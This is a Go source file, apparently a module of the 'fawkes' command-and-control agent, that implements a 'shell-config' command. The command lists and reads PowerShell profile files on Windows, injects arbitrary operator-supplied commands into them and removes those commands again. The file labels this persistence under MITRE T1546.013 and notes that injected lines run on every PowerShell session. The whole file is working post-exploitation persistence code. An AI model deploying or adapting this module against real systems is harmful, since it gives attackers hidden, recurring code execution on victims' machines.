//go:build windows

package commands

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"fawkes/pkg/structs"
)

type ShellConfigCommand struct{}

func (c *ShellConfigCommand) Name() string { return "shell-config" }
func (c *ShellConfigCommand) Description() string {
	return "List/read/inject/remove PowerShell profile files for persistence (T1546.013)"
}

type shellConfigArgs struct {
	Action  string `json:"action"`
	File    string `json:"file"`
	Line    string `json:"line"`
	User    string `json:"user"`
	Lines   int    `json:"lines"`
	Comment string `json:"comment"`
}

// PowerShell profile locations, in load order.
// Each entry: description, relative path from home dir, requires admin
type psProfile struct {
	Name      string
	Path      string // relative to home or absolute
	IsSystem  bool   // requires admin to write
	IsLegacy  bool   // Windows PowerShell 5.1 (vs PowerShell 7+)
	IsAbsPath bool   // if true, Path is absolute
}

func getPSProfiles() []psProfile {
	home, _ := os.UserHomeDir()
	docs := filepath.Join(home, "Documents")

	// Get PSHOME for system-wide profiles
	// PowerShell 7+: C:\Program Files\PowerShell\7
	// Windows PowerShell 5.1: C:\Windows\System32\WindowsPowerShell\v1.0
	ps7Home := `C:\Program Files\PowerShell\7`
	ps5Home := `C:\Windows\System32\WindowsPowerShell\v1.0`

	return []psProfile{
		// PowerShell 7+ profiles (load order)
		{"PS7 AllUsers AllHosts", filepath.Join(ps7Home, "Profile.ps1"), true, false, true},
		{"PS7 AllUsers CurrentHost", filepath.Join(ps7Home, "Microsoft.PowerShell_profile.ps1"), true, false, true},
		{"PS7 CurrentUser AllHosts", filepath.Join(docs, "PowerShell", "Profile.ps1"), false, false, true},
		{"PS7 CurrentUser CurrentHost", filepath.Join(docs, "PowerShell", "Microsoft.PowerShell_profile.ps1"), false, false, true},

		// Windows PowerShell 5.1 profiles (load order)
		{"PS5 AllUsers AllHosts", filepath.Join(ps5Home, "Profile.ps1"), true, true, true},
		{"PS5 AllUsers CurrentHost", filepath.Join(ps5Home, "Microsoft.PowerShell_profile.ps1"), true, true, true},
		{"PS5 CurrentUser AllHosts", filepath.Join(docs, "WindowsPowerShell", "Profile.ps1"), false, true, true},
		{"PS5 CurrentUser CurrentHost", filepath.Join(docs, "WindowsPowerShell", "Microsoft.PowerShell_profile.ps1"), false, true, true},
	}
}

func (c *ShellConfigCommand) Execute(task structs.Task) structs.CommandResult {
	if task.Params == "" {
		return structs.CommandResult{
			Output:    "Error: parameters required. Actions: list, read, inject, remove",
			Status:    "error",
			Completed: true,
		}
	}

	var args shellConfigArgs
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		parts := strings.Fields(task.Params)
		args.Action = parts[0]
		if len(parts) > 1 {
			args.File = parts[1]
		}
		if len(parts) > 2 {
			args.Line = strings.Join(parts[2:], " ")
		}
	}

	switch strings.ToLower(args.Action) {
	case "list":
		return psProfileList()
	case "read":
		return psProfileRead(args)
	case "inject":
		return psProfileInject(args)
	case "remove":
		return psProfileRemove(args)
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Unknown action: %s\nAvailable: list, read, inject, remove", args.Action),
			Status:    "error",
			Completed: true,
		}
	}
}

func psProfileList() structs.CommandResult {
	profiles := getPSProfiles()

	var sb strings.Builder
	sb.WriteString("PowerShell Profile Locations\n")
	sb.WriteString(strings.Repeat("=", 60) + "\n\n")

	for _, p := range profiles {
		exists := "[ ]"
		var sizeInfo string
		info, err := os.Stat(p.Path)
		if err == nil {
			exists = "[X]"
			sizeInfo = fmt.Sprintf(" (%d bytes)", info.Size())
		}

		adminNote := ""
		if p.IsSystem {
			adminNote = " (requires admin)"
		}

		sb.WriteString(fmt.Sprintf("  %s %s%s%s\n      %s\n", exists, p.Name, sizeInfo, adminNote, p.Path))
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

func psProfileRead(args shellConfigArgs) structs.CommandResult {
	path := resolveProfilePath(args.File)
	if path == "" {
		return structs.CommandResult{
			Output: "Error: file parameter required. Use profile name (e.g., 'PS7 CurrentUser CurrentHost') or full path.",
			Status: "error", Completed: true,
		}
	}

	content, err := os.ReadFile(path)
	if err != nil {
		return structs.CommandResult{
			Output: fmt.Sprintf("Error reading %s: %v", path, err),
			Status: "error", Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("=== %s (%d bytes) ===\n%s", path, len(content), string(content)),
		Status:    "success",
		Completed: true,
	}
}

func psProfileInject(args shellConfigArgs) structs.CommandResult {
	if args.Line == "" {
		return structs.CommandResult{
			Output: "Error: line parameter required (PowerShell command to inject)",
			Status: "error", Completed: true,
		}
	}

	path := resolveProfilePath(args.File)
	if path == "" {
		// Default to CurrentUser CurrentHost (PS7) — most commonly loaded
		home, _ := os.UserHomeDir()
		path = filepath.Join(home, "Documents", "PowerShell", "Microsoft.PowerShell_profile.ps1")
	}

	line := args.Line
	if args.Comment != "" {
		line = line + " # " + args.Comment
	}

	// Read existing content
	existing, _ := os.ReadFile(path)
	if strings.Contains(string(existing), line) {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Line already exists in %s — skipping injection", path),
			Status:    "success",
			Completed: true,
		}
	}

	// Ensure parent directory exists
	dir := filepath.Dir(path)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return structs.CommandResult{
			Output: fmt.Sprintf("Error creating directory %s: %v", dir, err),
			Status: "error", Completed: true,
		}
	}

	f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return structs.CommandResult{
			Output: fmt.Sprintf("Error opening %s: %v", path, err),
			Status: "error", Completed: true,
		}
	}
	defer f.Close()

	writeStr := line
	if len(existing) > 0 && existing[len(existing)-1] != '\n' {
		writeStr = "\n" + writeStr
	}
	writeStr = writeStr + "\n"

	if _, err := f.WriteString(writeStr); err != nil {
		return structs.CommandResult{
			Output: fmt.Sprintf("Error writing to %s: %v", path, err),
			Status: "error", Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("Injected into %s:\n  %s\n\nThis will execute on every PowerShell session for this user.", path, strings.TrimSpace(writeStr)),
		Status:    "success",
		Completed: true,
	}
}

func psProfileRemove(args shellConfigArgs) structs.CommandResult {
	if args.Line == "" {
		return structs.CommandResult{
			Output: "Error: line parameter required (exact line to remove)",
			Status: "error", Completed: true,
		}
	}

	path := resolveProfilePath(args.File)
	if path == "" {
		return structs.CommandResult{
			Output: "Error: file parameter required",
			Status: "error", Completed: true,
		}
	}

	content, err := os.ReadFile(path)
	if err != nil {
		return structs.CommandResult{
			Output: fmt.Sprintf("Error reading %s: %v", path, err),
			Status: "error", Completed: true,
		}
	}

	lines := strings.Split(string(content), "\n")
	var newLines []string
	removed := 0
	for _, l := range lines {
		if strings.TrimSpace(l) == strings.TrimSpace(args.Line) ||
			strings.Contains(l, args.Line) {
			removed++
			continue
		}
		newLines = append(newLines, l)
	}

	if removed == 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Line not found in %s", path),
			Status:    "success",
			Completed: true,
		}
	}

	if err := os.WriteFile(path, []byte(strings.Join(newLines, "\n")), 0644); err != nil {
		return structs.CommandResult{
			Output: fmt.Sprintf("Error writing %s: %v", path, err),
			Status: "error", Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("Removed %d line(s) from %s", removed, path),
		Status:    "success",
		Completed: true,
	}
}

// resolveProfilePath resolves a profile name or path to an absolute path.
// Accepts: profile name (e.g., "PS7 CurrentUser CurrentHost"), relative path, or absolute path.
func resolveProfilePath(file string) string {
	if file == "" {
		return ""
	}

	// If absolute path, use directly
	if filepath.IsAbs(file) {
		return file
	}

	// Try matching by profile name
	lower := strings.ToLower(file)
	for _, p := range getPSProfiles() {
		if strings.ToLower(p.Name) == lower {
			return p.Path
		}
	}

	// If it looks like a path (has separators or .ps1 extension), resolve relative to home
	if strings.Contains(file, string(filepath.Separator)) || strings.HasSuffix(file, ".ps1") {
		home, _ := os.UserHomeDir()
		return filepath.Join(home, file)
	}

	// Try as a filename in common profile directories
	home, _ := os.UserHomeDir()
	candidates := []string{
		filepath.Join(home, "Documents", "PowerShell", file),
		filepath.Join(home, "Documents", "WindowsPowerShell", file),
	}
	for _, c := range candidates {
		if _, err := os.Stat(c); err == nil {
			return c
		}
	}

	return file
}
